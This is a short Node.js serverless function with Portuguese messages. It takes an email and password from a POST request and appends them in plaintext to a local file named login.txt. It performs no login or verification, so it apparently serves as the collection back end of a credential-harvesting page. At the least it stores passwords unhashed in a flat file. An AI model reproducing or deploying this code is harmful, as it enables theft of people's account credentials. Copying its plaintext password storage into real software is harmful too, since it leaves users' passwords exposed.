const fs = require('fs');
const path = require('path');

exports.handler = async function(event, context) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: 'Método não permitido. Use POST.',
        };
    }

    const { email, senha } = JSON.parse(event.body);

    if (!email || !senha) {
        return {
            statusCode: 400,
            body: 'Campos obrigatórios não preenchidos.',
        };
    }

    const data = `email:${email}\nsenha:${senha}\n\n`;

    try {
        const filePath = path.join(__dirname, 'login.txt');
        fs.appendFileSync(filePath, data);
        return {
            statusCode: 200,
            body: 'Informações salvas com sucesso.',
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: 'Erro ao salvar as informações.',
        };
    }
};
